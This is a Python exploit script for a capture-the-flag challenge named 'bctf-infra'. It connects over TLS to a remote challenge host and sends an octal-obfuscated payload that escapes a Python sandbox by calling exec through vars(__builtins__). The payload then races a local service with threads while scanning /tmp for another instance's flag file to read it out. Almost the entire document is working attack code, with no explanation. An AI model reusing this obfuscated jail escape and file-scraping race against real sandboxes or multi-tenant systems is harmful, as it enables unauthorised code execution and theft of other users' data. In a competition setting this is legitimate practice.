#!/usr/bin/env python3
import argparse
import re
import socket
import ssl
import sys
import time


INNER = r'''
import os,socket,threading,time
stop=threading.Event()

def fire():
    while not stop.is_set():
        try:
            s=socket.create_connection(("127.0.0.1",1337),timeout=0.05)
            s.sendall(b"chal3\n")
            s.close()
        except Exception:
            pass

def scan():
    while not stop.is_set():
        try:
            for d in os.listdir("/tmp"):
                p=f"/tmp/{d}/app/flag.txt"
                try:
                    data=open(p).read()
                    if data.startswith("bctf{"):
                        print(data,flush=True)
                        stop.set()
                        return
                except Exception:
                    pass
        except Exception:
            pass

for _ in range(8):
    threading.Thread(target=fire,daemon=True).start()
for _ in range(3):
    threading.Thread(target=scan,daemon=True).start()

start=time.time()
while not stop.is_set() and time.time()-start<45:
    time.sleep(0.05)
print("DONE",stop.is_set(),flush=True)
'''


def enc(bs: bytes) -> str:
    return "".join(f"\\{b:03o}" for b in bs)


def build_payload() -> bytes:
    encoded_exec = enc(b"exec")
    encoded_inner = enc(INNER.encode())
    return f"vars(__builtins__)['{encoded_exec}']('{encoded_inner}')".encode()


def recv_some(sock: socket.socket, delay: float = 0.2) -> bytes:
    time.sleep(delay)
    sock.settimeout(0.5)
    chunks = []
    while True:
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        chunks.append(chunk)
    return b"".join(chunks)


def connect(host: str, port: int, use_ssl: bool, timeout: float) -> socket.socket:
    raw = socket.create_connection((host, port), timeout=timeout)
    if not use_ssl:
        return raw

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx.wrap_socket(raw, server_hostname=host)


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit for bctf-infra")
    parser.add_argument("host", nargs="?", default="bctf-infra.opus4-7.b01le.rs")
    parser.add_argument("port", nargs="?", type=int, default=8443)
    parser.add_argument("--no-ssl", action="store_true", help="connect without TLS")
    parser.add_argument("--timeout", type=float, default=90.0, help="overall receive timeout")
    args = parser.parse_args()

    payload = build_payload()

    with connect(args.host, args.port, not args.no_ssl, args.timeout) as sock:
        banner = recv_some(sock)
        if banner:
            sys.stdout.write(banner.decode("latin1", "replace"))
            sys.stdout.flush()

        sock.sendall(b"chal1\n")
        prompt = recv_some(sock)
        if prompt:
            sys.stdout.write(prompt.decode("latin1", "replace"))
            sys.stdout.flush()

        sock.sendall(payload + b"\n")
        sock.settimeout(args.timeout)

        data = b""
        start = time.time()
        while time.time() - start < args.timeout:
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                break

            if not chunk:
                break

            data += chunk
            text = chunk.decode("latin1", "replace")
            sys.stdout.write(text)
            sys.stdout.flush()

            match = re.search(rb"bctf\{[^}\r\n]+\}", data)
            if match:
                print(f"\n[+] Flag: {match.group(0).decode()}")
                return 0

    print("\n[-] Flag not found")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
